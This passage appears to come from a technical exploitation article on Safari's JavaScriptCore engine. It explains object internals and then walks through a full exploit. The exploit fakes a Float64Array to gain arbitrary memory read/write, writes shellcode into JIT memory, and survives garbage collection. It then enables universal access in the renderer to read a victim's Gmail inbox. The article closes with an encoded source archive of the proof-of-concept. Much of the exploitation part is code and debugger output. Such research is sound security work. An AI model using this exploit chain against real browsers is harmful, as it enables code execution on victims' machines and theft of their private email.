<p>This is just a few instructions slower than a property access in a native language such as C. Note that the structure ID and property offset are cached inside the code itself, thus the name for these kind of code constructs: inline caches.</p>
<p>Besides the property mappings, structures also store a reference to a ClassInfo instance. This instance contains the name of the class (&quot;Float64Array&quot;, &quot;HTMLParagraphElement&quot;, ...), which is also accessible from script via the following slight hack:</p>
<pre><code>Object.prototype.toString.call(object);
// Might print &quot;[object HTMLParagraphElement]&quot;</code></pre>
<p>However, the more important property of the ClassInfo is its MethodTable reference. A MethodTable contains a set of function pointers, similar to a vtable in C++. Most of the object related operations [20] as well as some garbage collection related tasks (visiting all referenced objects for example) are implemented through methods in the method table. To give an idea about how the method table is used, the following code snippet from JSArray.cpp is shown. This function is part of the MethodTable of the ClassInfo instance for JavaScript arrays and will be called whenever a property of such an instance is deleted [21] by script</p>
<pre><code>bool JSArray::deleteProperty(JSCell* cell, ExecState* exec,
                             PropertyName propertyName)
{
    JSArray* thisObject = jsCast&lt;JSArray*&gt;(cell);

    if (propertyName == exec-&gt;propertyNames().length)
        return false;

    return JSObject::deleteProperty(thisObject, exec, propertyName);
}</code></pre>
<p>As we can see, deleteProperty has a special case for the .length property of an array (which it won't delete), but otherwise forwards the request to the parent implementation.</p>
<p>The next diagram summarizes (and slightly simplifies) the relationships between the different C++ classes that together build up the JSC object system.</p>
<pre><code>        +------------------------------------------+
        |                Butterfly                 |
        | baz | bar | foo | length: 2 | 42 | 13.37 |
        +------------------------------------------+
                                      ^
                            +---------+
           +----------+     |
           |          |     |
        +--+  JSCell  |     |      +-----------------+
        |  |          |     |      |                 |
        |  +----------+     |      |  MethodTable    |
        |       /\          |      |                 |</code></pre>
<p>References | || inherits | | Put | by ID in | +----++----+ | | Get | structure | | +-----+ | Delete | table | | JSObject | | VisitChildren | | | |&lt;----- | ... | | +----------+ | | | | /  | +-----------------+ | || inherits | ^ | +----++----+ | | | | | | associated | | | JSArray | | prototype | | | | | object | | +----------+ | | | | | v | +-------+--------+ +-------------------+ | | ClassInfo | | Structure +---+ +--&gt;| | | | | | Name: &quot;Array&quot; | | property: slot | | | | | foo : 0 +----------+ +----------------+ | bar : 1 | | baz : 2 | | | +-------------------+</p>
<p>--[ 6 - Exploitation</p>
<p>Now that we know a bit more about the internals of the JSObject class, let's get back to creating our own Float64Array instance which will provide us with an arbitrary memory read/write primitive. Clearly, the most important part will be the structure ID in the JSCell header, as the associated structure instance is what makes our piece of memory &quot;look like&quot; a Float64Array to the engine. We thus need to know the ID of a Float64Array structure in the structure table.</p>
<p>----[ 6.1 - Predicting structure IDs</p>
<p>Unfortunately, structure IDs aren't necessarily static across different runs as they are allocated at runtime when required. Further, the IDs of structures created during engine startup are version dependent. As such we don't know the structure ID of a Float64Array instance and will need to determine it somehow.</p>
<p>Another slight complication arises since we cannot use arbitrary structure IDs. This is because there are also structures allocated for other garbage collected cells that are not JavaScript objects (strings, symbols, regular expression objects, even structures themselves). Calling any method referenced by their method table will lead to a crash due to a failed assertion. These structures are only allocated at engine startup though, resulting in all of them having fairly low IDs.</p>
<p>To overcome this problem we will make use of a simple spraying approach: we will spray a few thousand structures that all describe Float64Array instances, then pick a high initial ID and see if we've hit a correct one.</p>
<pre><code>for (var i = 0; i &lt; 0x1000; i++) {
    var a = new Float64Array(1);
    // Add a new property to create a new Structure instance.
    a[randomString()] = 1337;
}</code></pre>
<p>We can find out if we've guessed correctly by using 'instanceof'. If we did not, we simply use the next structure.</p>
<pre><code>while (!(fakearray instanceof Float64Array)) {
    // Increment structure ID by one here
}</code></pre>
<p>Instanceof is a fairly safe operation as it will only fetch the structure, fetch the prototype from that and do a pointer comparison with the given prototype object.</p>
<p>----[ 6.2 - Putting things together: faking a Float64Array</p>
<p>Float64Arrays are implemented by the native JSArrayBufferView class. In addition to the standard JSObject fields, this class also contains the pointer to the backing memory (we'll refer to it as 'vector', similar to the source code), as well as a length and mode field (both 32-bit integers).</p>
<p>Since we place our Float64Array inside the inline slots of another object (referred to as 'container' from now on), we'll have to deal with some restrictions that arise due to the JSValue encoding. Specifically we</p>
<pre><code>* cannot set a nullptr butterfly pointer since null isn&#39;t a valid
  JSValue. This is fine for now as the butterfly won&#39;t be accessed for
  simple element access operations

* cannot set a valid mode field since it has to be larger than
  0x00010000 due to the NaN-boxing. We can freely control the length
  field though

* can only set the vector to point to another JSObject since these are
  the only pointers that a JSValue can contain</code></pre>
<p>Due to the last constraint we'll set up the Float64Array's vector to point to a Uint8Array instance:</p>
<p>+----------------+ +----------------+ | Float64Array | +-------------&gt;| Uint8Array | | | | | | | JSCell | | | JSCell | | butterfly | | | butterfly | | vector ------+---+ | vector | | length | | length | | mode | | mode | +----------------+ +----------------+</p>
<p>With this we can now set the data pointer of the second array to an arbitrary address, providing us with an arbitrary memory read/write.</p>
<p>Below is the code for creating a fake Float64Array instance using our previous exploit primitives. The attached exploit code then creates a global 'memory' object which provides convenient methods to read from and write to arbitrary memory regions.</p>
<pre><code>sprayFloat64ArrayStructures();

// Create the array that will be used to
// read and write arbitrary memory addresses.
var hax = new Uint8Array(0x1000);

var jsCellHeader = new Int64([
    00, 0x10, 00, 00,       // m_structureID, current guess
    0x0,                    // m_indexingType
    0x27,                   // m_type, Float64Array
    0x18,                   // m_flags, OverridesGetOwnPropertySlot |
        // InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
    0x1                     // m_cellState, NewWhite
]);

var container = {
    jsCellHeader: jsCellHeader.encodeAsJSVal(),
    butterfly: false,       // Some arbitrary value
    vector: hax,
    lengthAndFlags: (new Int64(&#39;0x0001000000000010&#39;)).asJSValue()
};

// Create the fake Float64Array.
var address = Add(addrof(container), 16);
var fakearray = fakeobj(address);

// Find the correct structure ID.
while (!(fakearray instanceof Float64Array)) {
    jsCellHeader.assignAdd(jsCellHeader, Int64.One);
    container.jsCellHeader = jsCellHeader.encodeAsJSVal();
}

// All done, fakearray now points onto the hax array</code></pre>
<p>To &quot;visualize&quot; the result, here is some lldb output. The container object is located at 0x11321e1a0:</p>
<pre><code>(lldb) x/6gx 0x11321e1a0
0x11321e1a0: 0x0100150000001138 0x0000000000000000
0x11321e1b0: 0x0118270000001000 0x0000000000000006
0x11321e1c0: 0x0000000113217360 0x0001000000000010
(lldb) p *(JSC::JSArrayBufferView*)(0x11321e1a0 + 0x10)
(JSC::JSArrayBufferView) $0 = {
  JSC::JSNonFinalObject = {
    JSC::JSObject = {
      JSC::JSCell = {
        m_structureID = 4096
        m_indexingType = &#39;\0&#39;
        m_type = Float64ArrayType
        m_flags = &#39;\x18&#39;
        m_cellState = NewWhite
      }
      m_butterfly = {
        JSC::CopyBarrierBase = (m_value = 0x0000000000000006)
      }
    }
  }
  m_vector = {
    JSC::CopyBarrierBase = (m_value = 0x0000000113217360)
  }
  m_length = 16
  m_mode = 65536
}</code></pre>
<p>Note that m_butterfly as well as m_mode are invalid as we cannot write null there. This causes no trouble for now but will be problematic once a garbage collection run occurs. We'll deal with this later.</p>
<p>----[ 6.3 - Executing shellcode</p>
<p>One nice thing about JavaScript engines is the fact that all of them make use of JIT compiling. This requires writing instructions into a page in memory and later executing them. For that reasons most engines, including JSC, allocate memory regions that are both writable and executable. This is a good target for our exploit. We will use our memory read/write primitive to leak a pointer into the JIT compiled code for a JavaScript function, then write our shellcode there and call the function, resulting in our own code being executed.</p>
<p>The attached PoC exploit implements this. Below is the relevant part of the runShellcode function.</p>
<pre><code>// This simply creates a function and calls it multiple times to
// trigger JIT compilation.
var func = makeJITCompiledFunction();
var funcAddr = addrof(func);
print(&quot;[+] Shellcode function object @ &quot; + funcAddr);

var executableAddr = memory.readInt64(Add(funcAddr, 24));
print(&quot;[+] Executable instance @ &quot; + executableAddr);

var jitCodeAddr = memory.readInt64(Add(executableAddr, 16));
print(&quot;[+] JITCode instance @ &quot; + jitCodeAddr);

var codeAddr = memory.readInt64(Add(jitCodeAddr, 32));
print(&quot;[+] RWX memory @ &quot; + codeAddr.toString());

print(&quot;[+] Writing shellcode...&quot;);
memory.write(codeAddr, shellcode);

print(&quot;[!] Jumping into shellcode...&quot;);
func();</code></pre>
<p>As can be seen, the PoC code performs the pointer leaking by reading a couple of pointers from fixed offsets into a set of objects, starting from a JavaScript function object. This isn't great (since offsets can change between versions), but suffices for demonstration purposes. As a first improvement, one should try to detect valid pointers using some simple heuristics (highest bits all zero, &quot;close&quot; to other known memory regions, ...). Next, it might be possible to detect some objects based on unique memory patterns. For example, all classes inheriting from JSCell (such as ExecutableBase) will start with a recognizable header. Also, the JIT compiled code itself will likely start with a known function prologue.</p>
<p>Note that starting with iOS 10, JSC no longer allocates a single RWX region but rather uses two virtual mappings to the same physical memory region, one of them executable and the other one writable. A special version of memcpy is then emitted at runtime which contains the (random) address of the writable region as immediate value and is mapped --X, preventing an attacker from reading the address. To bypass this, a short ROP chain would now be required to call this memcpy before jumping into the executable mapping.</p>
<p>----[ 6.4 - Staying alive past garbage collection</p>
<p>If we wanted to keep our renderer process alive past our initial exploit (we'll later see why we might want that), we are currently faced with an immediate crash once the garbage collector kicks in. This happens mainly because the butterfly of our faked Float64Array is an invalid pointer, but not null, and will thus be accessed during GC. From JSObject::visitChildren:</p>
<pre><code>Butterfly* butterfly = thisObject-&gt;m_butterfly.get();
if (butterfly)
    thisObject-&gt;visitButterfly(visitor, butterfly,
                               thisObject-&gt;structure(visitor.vm()));</code></pre>
<p>We could set the butterfly pointer of our fake array to nullptr, but this would lead to another crash since that value is also a property of our container object and would be treated as a JSObject pointer. We will thus do the following:</p>
<pre><code>1. Create an empty object. The structure of this object will describe
   an object with the default amount of inline storage (6 slots), but
   none of them being used.

2. Copy the JSCell header (containing the structure ID) to the
   container object. We&#39;ve now caused the engine to &quot;forget&quot; about the
   properties of the container object that make up our fake array.

3. Set the butterfly pointer of the fake array to nullptr, and, while
   we&#39;re at it also replace the JSCell of that object with one from a
   default Float64Array instance</code></pre>
<p>The last step is required since we might end up with the structure of a Float64Array with some property due to our structure spraying before.</p>
<p>These three steps give us a stable exploit.</p>
<p>On a final note, when overwriting the code of a JIT compiled function, care must be taken to return a valid JSValue (if process continuation is desired). Failing to do so will likely result in a crash during the next GC, as the returned value will be kept by the engine and inspected by the collector.</p>
<p>----[ 6.5 - Summary</p>
<p>At this point it is time for a quick summary of the full exploit:</p>
<pre><code>1. Spray Float64Array structures

2. Allocate a container object with inline properties that together
   build up a Float64Array instance in its inline property slots. Use a
   high initial structure ID which will likely be correct due to the
   previous spray. Set the data pointer of the array to point to a
   Uint8Array instance.

3. Leak the address of the container object and create a fake object
   pointing to the Float64Array inside the container object

4. See if the structure ID guess was correct using &#39;instanceof&#39;. If not
   increase the structure ID by assigning a new value to the
   corresponding property of the container object. Repeat until we have
   a Float64Array.

5. Read from and write to arbitrary memory addresses by writing the
   data pointer of the Uint8Array

6. With that repair the container and the Float64Array instance to
   avoid crashing during garbage collection</code></pre>
<p>--[ 7 - Abusing the renderer process</p>
<p>Usually, from here the next logical step would be to fire up a sandbox escape exploit of some sort for further compromise of the target machine.</p>
<p>Since discussion of these is out of scope for this article, and due to good coverage of those in other places, let us instead explore our current situation.</p>
<p>----[ 7.1 - WebKit process and privilege model</p>
<p>Since WebKit 2 [22] (circa 2011), WebKit features a multi-process model in which a new renderer process is spawned for every tab. Besides stability and performance reasons, this also provides the basis for a sandboxing infrastructure to limit the damage that a compromised renderer process can do to the system.</p>
<p>----[ 7.2 - The same-origin policy</p>
<p>The same-origin policy (SOP) provides the basis for (client-side) web security. It prevents content originating from origin A from interfering with content originating from another origin B. This includes script level access (e.g. accessing DOM objects inside another window) as well as network level access (e.g. XMLHttpRequests). Interestingly, in WebKit the SOP is enforced inside the renderer processes, which means we can bypass it at this point. The same is currently true for all major web browsers, but chrome is about to change this with their site-isolation project [23].</p>
<p>This fact is nothing new and has even been exploited in the past, but it is worth discussing. In essence, this means that a renderer process has full access to all browser sessions and can send authenticated cross-origin requests and read the response. An attacker who compromises a renderer process thus obtains access to all the browser sessions of the victim.</p>
<p>For demonstration purposes we will now modify our exploit to display the users gmail inbox.</p>
<p>----[ 7.3 - Stealing emails</p>
<p>There is an interesting field inside the SecurityOrigin class in WebKit: m_universalAccess. If set, it will cause all cross-origin checks to succeed. We can obtain a reference to the currently active SecurityDomain instance by following a set of pointers (whose offsets are again dependent on the current Safari version). We can then enable universalAccess for our renderer process and can subsequently perform authenticated cross-origin XMLHttpRequests. Reading emails from gmail then becomes as simple as</p>
<pre><code>var xhr = new XMLHttpRequest();
xhr.open(&#39;GET&#39;, &#39;https://mail.google.com/mail/u/0/#inbox&#39;, false);
xhr.send();     // xhr.responseText now contains the full response</code></pre>
<p>Included is a version of the exploit that does this and displays the &quot;users&quot; current gmail inbox. For reasons that should be clear by now this does require a valid gmail session in Safari ;)</p>
<p>--[ 8 - References</p>
<p>[1] http://www.zerodayinitiative.com/advisories/ZDI-16-485/ [2] https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/ [3] http://trac.webkit.org/wiki/JavaScriptCore [4] http://www.ecma-international.org/ ecma-262/6.0/#sec-ecmascript-data-types-and-values [5] http://www.ecma-international.org/ecma-262/6.0/#sec-objects [6] https://en.wikipedia.org/wiki/Double-precision_floating-point_format [7] http://www.ecma-international.org/ ecma-262/6.0/#sec-array-exotic-objects [8] http://www.ecma-international.org/ ecma-262/6.0/#sec-ecmascript-standard-built-in-objects [9] https://developer.mozilla.org/en-US/docs/Web/JavaScript/ Reference/Global_Objects/Array/slice). [10] https://github.com/WebKit/webkit/ blob/320b1fc3f6f47a31b6ccb4578bcea56c32c9e10b/Source/JavaScriptCore/runtime /ArrayPrototype.cpp#L848 [11] https://developer.mozilla.org/en-US/docs/Web/ JavaScript/Reference/Global_Objects/Symbol/species [12] http://www.ecma-international.org/ecma-262/6.0/#sec-type-conversion [13] https://bugzilla.mozilla.org/show_bug.cgi?id=735104 [14] https://bugzilla.mozilla.org/show_bug.cgi?id=983344 [15] https://bugs.chromium.org/p/chromium/issues/detail?id=554946 [16] https://www.gnu.org/software/guile/manual/html_node/ Conservative-GC.html [17] http://www.ecma-international.org/ ecma-262/6.0/#sec-ecmascript-language-types-number-type [18] http://www.ecma-international.org/ecma-262/6.0/#sec-typedarray-objects [19] https://developers.google.com/v8/design#fast-property-access [20] http://www.ecma-international.org/ ecma-262/6.0/#sec-operations-on-objects [21] http://www.ecma-international.org/ecma-262/6.0/ #sec-ordinary-object-internal-methods-and-internal-slots-delete-p [22] https://trac.webkit.org/wiki/WebKit2 [23] https://www.chromium.org/developers/design-documents/site-isolation</p>
<p>--[ 9 - Source code</p>
<p>begin 644 src.zip M4<span class="math inline">$L#!`H``````%&amp;N1DD````````````````$</span><code>!P</code><W)C+U54"0`#":OV5Q6K
M]E=U><code>L``03U</code>0<code>!%````!02P,$%`````@`%ZY&amp;2;A,.B1W`P</code>)<span class="citation">@D</span><code>X` M'`!S&lt;F,O96UA:6PN:'1M;%54&quot;0`#G:KV5PFK]E=U&gt;`L``03U`0``!%````&quot;- M5E%OVS80?L^ON'H/DE9;2H:B*&amp;([F)%D78:U*9H@;9$%`2V=;082J9)4;*'M M?]^1LA39L=7J11)Y]]WW'7E'CEZ&lt;79Y&gt;?_EP#@N3I2&lt;'H_J%+#DY`!AI4Z9H MOP&quot;F,BGAF_L$F$EA!C.6\;0\ADP*J7,6X]#-_K&quot;.T=K3@&lt;2*YP:TBL&gt;]PO!4 MAP^Z=T(F;OQDVX0+\_I5MTF^%%L&amp;3Q85VUDA8L.E@%P1GI_I&gt;=&quot;0!TAD7&amp;0H M3&amp;A%A5P(5-&gt;X,O!R#&amp;0)+\'[3WBU&amp;O&gt;*(CCCFDU3U&amp;`6&quot;)IE.)&quot;*SSF%D&quot;F/ M2\J)HBFN0:%(4*&amp;BV#)&amp;K8&amp;)!'0QU?BUH*!I62/.T,0+K.83KO.4E15ZH5%I MF&amp;&gt;,I\#%5*Z`SX&quot;M!S1!6F6XXMKH&lt;%.N@WQ'9GY;+WG[+[B^*5)2:D7X07O: M/E6&gt;&gt;K&gt;#._CGZA0&gt;B8#%$]+`8^,6PF0JE&gt;%BW@N&amp;&amp;^X*3:'$T]@Z;6NA5S2; M.V499E*59,Z2:*FX01LXXX8_8MAXT/+ZA-_\/S(%#WJU4#`&amp;@4OX_.[?OXW) M/]I\:K/;=)(DUIS12\Y\-]2B7*O]W:K=A*.$:\-$C/`G]&amp;@K-&amp;BAD5&gt;&amp;_.:4 MO*V(3_$J?:'5=V'WL4_C?@/1A\/5'X?!;B+=-'Y.HMK^YRN,3ZDZ:3MW46H1 M&gt;KV/T%4#6-B]M4;=)K8S;!=-@J.%+R]=\7QPM=/%=&quot;&gt;^Y7VTE_&gt;.&quot;,]8[V'Q MR\0[*&gt;\![\.;7Z+&lt;3;:#IBTU:&gt;M,H:&gt;K9C25,D4F(&amp;9IB@ED]X7@MKA9.HEM M&lt;PI#&amp;`8-P%J.J\P=4IH]/`WZ&lt;'MTUXY=J?$&amp;G8_7]G!E$&lt;H&lt;A&gt;^]/;_V^N`M MJ`#T&lt;1391A?.I9Q3SXEEYOZC(CJ,?G/MD$QG+-782F8%IJGU/NL'&quot;G4NA49: MKLJJ'K`]?[BYQH8I&lt;T'M&gt;T7&amp;M1D=$#1P.?,]:W)S&lt;?[I_FQR/1E[P:8SQ=[O M6AU51/PI1,O=-NAV[/$8!D?P_7L+TPWMZ=I_47IH&lt;8VD0\$H%AM(F&amp;%P[&amp;^W MZ&lt;J^9A?L[-=62FQ+39BV$DV[&amp;%LD^PVWYUOZ/9T:&lt;RD$@YPI2KSM_&amp;_=X57# MT0)2:J&quot;4A:I/..',DB++PS#L/0-=4PHVCN4E@&lt;AE*$4J64)LF^-O6%U&quot;6K&lt;# MPPU=2&quot;Y&lt;K!N.2U2CJ!H[&amp;$75A6=DKP/VMWY7UZ'_`5!+`P04````&quot;`#T;D9) M%5KXM!8&amp;``!H$@``#``&lt;`'-R8R]I;G0V-&quot;YJ&lt;U54&quot;0`#NSOV5]&gt;J]E=U&gt;`L` M`03U`0``!%````&quot;]5_UNVS80_]]/&lt;0NP6D)MQ0F&quot;+&amp;B:`5G;#=NP#*B[%5C1 M`;1$V6QDTB,IQ\::O&lt;H&gt;9B^V.U*2J8^F'5#,&quot;!&quot;;.M['[SY^I^/CT?$QO!)R M#VN5E04'NV(6-EIM1&lt;8-+,02HO.SA;`Q&quot;&amp;GYDFN3X!6Z]4QM]EHL5Q:B-(;3 MV&lt;DYS-FZY`5\I]4_?U=2+_D?I=&quot;HJK2B,,D[0^?TX#FSS.XW:%&amp;!YAL4X=+&quot; M^=D4C?5L?8^_M61%L9^@A[Q^#L*`L4KS#)@!!K_@^&lt;6UUFR/$E`(:S$B+C/! M)&quot;SVEH/2&amp;=?)*&quot;]E:H62I/?\+-K&amp;\.&lt;(\$-8H/92HE2Q%W+I;S'2F#B)+=/N MS,`52'X76(PNXLN1DS%WPJ8KB&quot;@ZE4.CG3XI,QS&amp;LEPON!X_:8Z=:E0YGNW&amp; M\!A^8G:5Y(52&amp;GU+K)I;C&lt;Y$)^=HHJW)N&quot;&lt;=32*':)L8R[0UKX5=1:0VCELR MM464*Q&gt;H)3H-=!^4%%PN[0J^A%.XNH*381WC&amp;3F]K&lt;)OGA!48OG&quot;PW^%J*[X MKA#Y/MI.X*)CS6&amp;:&amp;&amp;XC!V:2:[6.FMMQHOD6RX%'&lt;?&gt;&gt;YNRV&quot;XI:O..I'0(% MRP)AD2GEQ&gt;4^S$W?EVWBOO&gt;LW@,OT%#_:@NT+ZXPS)X(?&gt;Q*JSMXA?7Q0FM, M\I&amp;OV75I+*S8%FMVE[+4%GNX0$M\C9UADJ..$QU7NRY^'&quot;8J\UQ(GG60Z@BC M$&quot;L+VY;I1&gt;#0A%0AOKI,L2&gt;QJ:O.Q^PSO2PIBB:(^U'=&lt;&quot;^Y+35*0*;*!;;K MW0HKUC6Y8&gt;MV+^)@:&quot;8%H_[U/6E7PB3,//?WKZ#N[BA,+@VL%4]O(4?7;MA- M\X!2YF!\\]5;JO'9+L_AT:/Z\/QP^/X]=,YXIZD\*C077C*Y#*!QPRI%(*2R ML.&quot;','!R+?9-\$=QT$/:`S-W&gt;&quot;:EW+#T-JI^X6Q@B/?$.U1C&gt;MD']1W;,I-J ML;'8CT6)\/Y7=-U,Q#F+?TIB16Z4,8*`)B#K.4WCEI1J&quot;AO&gt;S':SV&gt;QD%GPF M#L(\#\_B6G]6.A:H&quot;@!KB'J=QK,O)R:H_,-4_S#_U07S@5Q32MLYI82V&lt;A=3 M-@?SWDW[9TMQY70KQQC\M[X&gt;IPNUPS1,4.P9L&quot;PS&lt;/K[V07!TG2&amp;2^#8N$QM MF&quot;5&amp;3$8'OQPR1BSEO%Q$]),P;R4A&amp;!$TG+5CL4^OKXZ9ZRS[H)EN$:.I#]6H M[1,N5EKN+($G2D?N!PYV/M0D/%@`E=602A[L$_+!,[UUWY=BRR76=,9W'9/7 M-K0I!HSZ^A%O'[+E6[$?9&quot;D)6&quot;P89$KPU![8K_&gt;`CT1=[1`UV?9`Z'%IX.,W MS(@4L&lt;8AL&gt;96I,$(P%INS&amp;(Z7`GXGN&lt;&amp;Z&lt;%'0]V[WI1^?E#QXI'0,&quot;;_Q^!Y M.6FL/&gt;&gt;ITHRX@F:)9Y&quot;:H$%MN'9J3`*OV&quot;TF.V6:UU?1FI\3E@&quot;IZ&lt;60R;8&gt; M0].@HJ+,A]-L?XV)*)^`1&quot;5F`,Y!J.LITQ@..-\KZE&amp;U'QS5O+C!&amp;&lt;&amp;E*I&gt;K MP'&lt;&quot;H?'M&quot;%.8)Q*'=(?822JB]A58![-+_/&lt;4NF[@Z&gt;/'?1?(XR\./F.1]O&gt;A MX86E=&lt;=OOGYU#A]T'*WQ2]AF4^RK4='(!\+WW97`=&lt;453&quot;7NT'&lt;*)QX5E5^# MXI`&amp;J`1O./5#D,D:0,F7D0QS-@3&lt;Q0!2=0.CU%^R:GKL]/Y0&amp;YR%#I;D9UFG M[7Z&quot;6_-E-S2&amp;V5UT0T$EPZ$@'40,9W$8#06&quot;#:'W+IA/&quot;;)3ODY!J&lt;F90Y#D M5NN7,]'.:VV5+G]=;4:A&quot;QT,42Q(]1&quot;&amp;#5&quot;G0T!-^T`AP0T#A:\R_Q=0TQ90 MTX\!]11WD,^(TOW(OX%7VS:]^S8]&gt;1BA[5VOO^`1Y=#CZG4_JQ:-9.2+F#BC MOU1G-3[AJW&quot;U-@RN$%G5&quot;54LA]E1&lt;S+QCX\&amp;65=P\KPAFJ1B'GSU5RDCA@X&quot; MQ6&amp;_4D46L%`R&amp;AV8=GA^-,5R$PZ(RKGHX%T&lt;'R8,RM68-YLU-7&quot;CZ[K3H0^H M:T1[&amp;J&gt;AQGFGE!_0V(C6&amp;N=J[8AX[1;VTF!F_8YAZM3^QK5JS7%:VIK1U7KB MII?;`)A%*#$1#N_#C@!W',71!K44WVT*)1PIO^:+'X5-$G@2C_X%4$L#!!0` M</code>(<code>^N1DF4@XGQ3`,</code>%<code>(```,</code>!P<code>&lt;W)C+W!W;BYH=&amp;UL550)``..JO97 M&quot;:OV5W5X&quot;P</code>!!/4!<code>$4````(566V_:,!1^[Z\XY:5!T$`OZD.A:!6EVJIJ MG0I:-W5],(D#;A,[LD^X:.I_WW$N)*'0(82#_9WS?&gt;=B._W#FX?AY/&gt;/$&lt;PQ M&quot;@&lt;'_6+@S!\&lt;`/0-KD-NGP&quot;FRE_#W_01(%`2CP,6B7!]&quot;9&amp;2RL3,X[UT]=T: M=G++U(FG18Q@M'?52%&quot;$QGTUC0%!TOG!-D1(O#C_'!(OY1:@1&amp;1J@T1Z*)2$ M6),_)S*SYD8\@*^\).(271N4*Z3D&gt;L)7&quot;*TK(&quot;2TX.B//&quot;JB28=.!QYY'%*0 M!G#.X&gt;[;Y-A342Q&quot;[H.G?$XIT&lt;!*WJ7`&gt;8J&lt;B0678.8\#%,&lt;DS[H1!H0Z.:N M&quot;X;)7)C,&amp;8VQYHAK6'!MK#^?QUSZI!F,D!XA,)\R0*N!6)&amp;.6*N8:S)206`X MFL(_#%42^C`EJX@P&quot;X).$R1U1$/?F5(^&lt;*F2V3R-0JJE6T\BZ1T7`3B;4*H9 M%0$XA\+\3$+*)9N&amp;W&amp;E6E^TGJT3C^?@%[L;#36!2(2PV9BY&lt;3Y5&amp;(6&gt;-9J]F M3NE(M&quot;SG\L+4=$;LC5-EAGEA;O-Y9UO*Q@&quot;9GG%T5MN`DA!6=1D5VCRYMTI[ M:4-`UA#,&gt;G;K?)159\$T&quot;+B&quot;;H^&amp;/IQTN_:IU=K%G&gt;L2S4_)&lt;X49&gt;&amp;=F2-Z8 M0'':B1&amp;/E%Z3%?,[2RV0VY)$`JE!2[FTM1QBK7KXKI:I/6=F#3'3&gt;%E=!3AQ MX9ZS-^K^6%&amp;)N094]*?,&quot;/5;D?&amp;ZY6EN:;T7MO2K@*^XEZ!MB%QUW&gt;[,A:&lt;T M@');D0O-ZZAS%X8L#%/O'_AM-&gt;PD%61OU_0^H*]]7Y,%HT$%CIVI@(H&amp;;[W` M9K&gt;4K::FK]Q#^`(-.E\*7]5,6XXR[IPIB]ZU-?MFST6'YIW&quot;N@VGY\W=`D9E M`H4TR.R1D5'7*;8%O`H&lt;DNS/V.L.VG!RL4=#FE/_@X`*Q3:[]Q_JBFD;SD[W M\#X^_2IZ/6,LW+JHQDBXF=.L,E=,;5?1&gt;ME7KNM6#Z)&lt;5;I['&amp;\CI3P2=[@] MI$PDU%KD-NWM?;YM58N&gt;R[&gt;PS&lt;GXZ^C^?OAP,Z*D/'=7GM&gt;&amp;\O&lt;EYUL*Z=.I MK62HF$_`H'+RU4_OC;MF#]Y[V55=N4-1(%W;9?L^)O9R['&gt;R^8-^)WLUZ-N+ MT_XMQNS%X1]02P,$%`````@`)*Y&amp;2&gt;G85Y(7&quot;@``Z!H</code>H<code>'</code>!S<F,O<'=N
M+FIS550)``.SJO97UZKV5W5X"P`!!/4!```$4````*U9ZW+;N!7^GZ=`\D=4
MK="RXWHS=K+3Q+G4F2;>B;/)3#UN!B(A<span class="math inline">0<em>E</em></span>&lt;<code>E0LI+Z6?HP?;%^!P!)Z.)N MNE/M[,J2@'/YSG=NW/W]&gt;_O[[&quot;V7)1,WE=+2LKG.&amp;R52]M)_-LP6@DV:&amp;&gt;-E M3H&gt;K6B]D+@SC;#</code>7<UVO!DQ/OHC,LF4ALX)EO&03P1HCW'FK62UX3M?9LI96
M,%Y/I*UYO6+^/N-Y7@MCA$EQ@>Z<Z6I5RUEA69(-V>'XX)A=%'M=ZW__ M<em>YQZ+WYK)&quot;ZRQDIETB_&amp;Z9&quot;E/3[&quot;!SKD9=6B&lt;ZZJY5Q:N?&quot;JV-G'EP])<sup>L.C MX-#-J/O83&gt;S2J&amp;=<em>+</em><code>S7.96ZC*2&lt;(*?^5=9SIB&gt;]BZ06'Q^PQ?\,JME M90,XWCC&quot;DD^DDG9%P&amp;1</code>!H#HIF9Z6;(I_RIVW<span class="math inline">$SO&gt;6]M4Y=&gt;@E=&amp;&gt;N@CV5UN MWV.Z9L;6,#&quot;]-VW*S)E/5_4T\2&gt;&amp;[/L]AM&gt;&quot;UXCF4W9U?&gt;H^3W$</span>SH2? MXNT).QC3'WM[0W&gt;&quot;7CRM&amp;E,DDNVQ&lt;7KPZ-%/P]/V)P9[G]4U1X0;8XD-9.JJ M<span class="math inline">$O[;3](6+W0S48&quot;K,V`&quot;73PU2F8B&amp;8_8]P57C;B8GK#6]@3FXH02Y&lt;P6WC!G MM/?E^A0T&lt;P@=G;+;VZ'W)'QU[C@QK?7&lt;JTTF5X^N&lt;&gt;0V1I;'$</span>#KM0)=;ENG2 M(D&amp;(&amp;+SRTE0;-1<span class="math inline">$TQ[&quot;,0PN*8]:&amp;0N*&quot;47AI$</span>F4]MX,D=(09KG:&quot;/;Z-8 MT5G#&lt;[5#][Y'Z?AM%Z,&gt;B=<code>;?Y:S130@4F4)QPEO*30!S'&gt;L_%$,2N!E! MA*B-T%DALJ],&gt;KKCKBP%</code>[Z+1I6BYK<code>A0DV:C]W720M;$'Q?FG?\71*2</code>'A$ M3G1T<sup>-50K$A3G</sup>M(6KT0(WP+M9TJ(Q&quot;YID)F;]<TJGG[OMYU8APSSFU(>R+4 M3.D)5UN%U/..&gt;TZ<span class="math inline">6<em>M</em><em>H</em>54<em>J</em>)<em>Q</em>5</span>WQ=:\JJ2=E=6R3&amp;+ZH&quot;8T1+DHWSN'<em>L3] MTOW&gt;0<span class="math inline">$YW+9#E`ZSI?CU_\8$</span>@=F:&amp;%&amp;&amp;%1DJS!%8;T7U)/L@R%S=MO2K%C847 M0C&quot;CM!W%&amp;E!.<SJF)-*$NT-*&CMB7XBA2S"21(%>9IBR2UEFE</em>.B)F6-R@DJ MSB#391HI$&quot;4<em>(</em>I,I&quot;)89)WQ5'F=TUT<em>&amp;#T72X)?J&amp;B+4W.XQJ0</em>_GEZZP MK@<span class="math inline">$4\&gt;PMMT7J#R;#U.IP^M'Q,*U%I3C28__J'_SAM^N]_=F(#0;#U#03!(:R MYL\AG^AUV^O?D&gt;GC&amp;^1Z2/8-0]HZ48HE&gt;Z4T1_US29T&lt;1-+;&amp;I&quot;C.[N3Z.V5 MJ-=ZD_^ABSK@,Y8#]W1-&quot;K]:A^4:JJDEK.L*S//5B/?%B`(O1.7BTFOJ^J9R MJ;,.R:VO1X&amp;4@)02'V:WWXY3=M8Z$</span><code>C1\]J!&amp;:/2&gt;67:^P&gt;@%V)9$0FI9&amp;^&gt; MQ@2$'-1$OF#H@(JXHLH44)24A4$&lt;7F1GSBWO&gt;H=[ITN4P&gt;Q7O#]VXKM+ARW% 